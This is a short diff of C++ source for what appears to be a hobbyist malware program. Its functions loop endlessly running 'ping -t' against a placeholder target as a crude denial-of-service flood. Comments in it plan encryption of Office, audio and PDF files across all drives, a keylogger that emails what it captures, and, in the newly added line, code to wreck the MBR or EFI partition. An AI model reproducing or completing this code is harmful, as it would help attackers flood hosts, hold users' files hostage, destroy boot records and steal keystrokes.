@@ -55,14 +55,14 @@ void DDoS2(){
 	}
 void DDoS3(){
 		do{
-		string DoS3 = (string)"ping -t ping -t insert_any_web_or_IP_Address_Here";
+		string DoS3 = (string)"ping -t insert_any_web_or_IP_Address_Here";
 		system( DoS3.c_str()); 
 		}
 	while (Z!=32767);
 	}
 void DDoS4(){
 		do{
-		string DoS4 = (string)"ping -t ping -t insert_any_web_or_IP_Address_Here";
+		string DoS4 = (string)"ping -t insert_any_web_or_IP_Address_Here";
 		system( DoS4.c_str()); 
 		}
 	while (Z!=32767);
@@ -137,6 +137,7 @@ void ChineseCommunistParty(){
 void LockDown(){
 CovIdiot();
 //insert file encryption code here, this function must encrypt all files in all drives with these file extensions: Office [*.doc(x), *.xls(x), *.ppt(x), *.pps(x)], some music or audio files (*.ac3, *.ec3, *.atmos, *.dts,*.wav,*.mp3,*.flac,*.aiff,*.m4a,*.aac), *.pdf files//
+//insert any code for fucking MBR or EFI Partition up, you can use this program as a payload for Assembly or machine Language code for messing MBR or EFI partition//
 	}
 int Darurat_Sipil(void){
 //insert keylogging + auto email sending code here, ensure it's working//
